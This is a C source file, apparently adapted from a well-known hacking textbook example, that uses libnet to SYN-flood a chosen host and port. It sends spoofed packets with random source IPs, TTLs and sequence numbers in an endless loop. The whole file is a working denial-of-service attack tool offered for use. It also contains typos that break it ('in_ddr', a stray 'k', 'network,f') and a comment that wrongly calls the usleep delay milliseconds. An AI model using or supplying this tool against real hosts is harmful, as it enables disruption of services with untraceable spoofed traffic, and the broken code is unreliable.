#include <libnet.h>

#define FLOOD_DELAY 5000 // delay between packet injeccts by 5000 ms

/* returns an ip in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr) {
    return inet_ntoa(*((struct in_ddr *)ip_addr_ptr));k
}

int main(int argc, char *argv[]) {
    u_long dest_ip;
    u_short dest_port;
    u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
    int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

    if (argc < 3) {
        printf("usage:\n%s\t <target host> <target port>\n", argv[0]);
        exit(1);
    }

    dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // the host
    dest_port = (u_short)atoi(argv[2]); // the port

    network = libnet_open_raw_sock(IPPROTO_RAW); // open network interface
    if (network == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run as root.\n");
    libnet_init_packet(packet_size, &packet); // allocate memory for packet
    if (packet == NULL)
        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

    libnet_seed_prand(); // seed the random number generator

    printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
    while (1) {
        libnet_build_ip(LIBNET_TCP_H,       // size of the packet w/o ip header
            IPTOS_LOWDELAY,                 // ip tos
            libnet_get_prand(LIBNET_PRu16), // ip id (randomized)
            0,                              // frag suff
            libnet_get_prand(LIBNET_PR8),   // TTL randomized
            IPPROTO_TCP,                    // transport protocol
            libnet_get_prand(LIBNET_PRu32), // source ip (randomized)
            dest_ip,                        // destination ip
            NULL,                           // payload (none)
            0,                              // payload length
            packet);                        // packet header memory

        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // source tcp port (random)
            dest_port,                                   // destination tcp port
            libnet_get_prand(LIBNET_PRu32),              // sequence number (random)
            libnet_get_prand(LIBNET_PRu32),              // acknowledgement number (random)
            TH_SYN,                                      // control flags (SYN flag set only)
            libnet_get_prand(LIBNET_PRu16),              // window size (randomized)
            0,                                           // urgent pointer
            NULL,                                        // payload (none)
            0,                                           // payload length
            packet + LIBNET_IP_H);                       // packet header memory

        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
            libnet_error("LIBNET_ERR_FATAL", "can't compute checksum\n");

        byte_count = libnet_write_ip(network,f packet, packet_size); // inject packet
        if (byte_count < packet_size)
            libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written. (%d of %d bytes)", byte_count, packet_size);

        usleep(FLOOD_DELAY); // wait for FLOOD_DELAY milliseconds
    }

    libnet_destroy_packet(&packet); // free packet memory

    if (libnet_close_raw_sock(network) == -1) // close the network interface
        libnet_error(LIBNET_ERR_WARNING, "can't close network interface");

    return 0;
}
